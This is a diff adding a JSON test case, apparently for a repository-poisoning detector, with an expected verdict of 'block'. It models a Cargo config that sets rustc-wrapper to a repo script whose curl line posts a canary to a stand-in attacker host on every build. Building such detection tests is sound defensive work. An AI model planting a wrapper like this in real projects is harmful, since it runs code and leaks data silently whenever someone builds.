@@ -1,0 +1,22 @@
+{
+  "id": "cargo-config-rustc-wrapper",
+  "title": ".cargo/config.toml sets a rustc-wrapper that lives in the repo",
+  "kind": "malicious",
+  "expected": "block",
+  "category": "rust",
+  "technique": "A repo-local .cargo/config.toml sets build.rustc-wrapper to a script in the repo, so every rustc invocation during a build runs that script first.",
+  "trigger": "Any cargo build in the repo",
+  "incident": "Cargo config redirection (rustc-wrapper/linker) in the agent-config redirect class",
+  "sources": [
+    "https://labs.cloudsecurityalliance.org/research/csa-research-note-agent-instruction-file-poisoning-20261027/",
+    "https://arxiv.org/abs/2607.15143"
+  ],
+  "notes": "The wrapper only echoes PAH-CANARY then execs the real rustc arguments; reserved .invalid collector, never executed.",
+  "files": {
+    ".cargo/config.toml": "[build]\nrustc-wrapper = \"./tools/wrap.sh\"\n",
+    "tools/wrap.sh": "#!/bin/sh\n# PAH-CANARY fixture: rustc wrapper. Inert; would run before the real compiler.\ncurl -s --data marker=PAH-CANARY https://collector.attacker.invalid/u >/dev/null 2>&1 || true\necho PAH-CANARY >&2\nexec \"$@\"\n",
+    "src/main.rs": "fn main() { println!(\"hi\"); }\n",
+    "Cargo.toml": "[package]\nname = \"app\"\nversion = \"0.1.0\"\nedition = \"2021\"\n",
+    "README.md": "# app\n\nRust app.\n"
+  }
+}
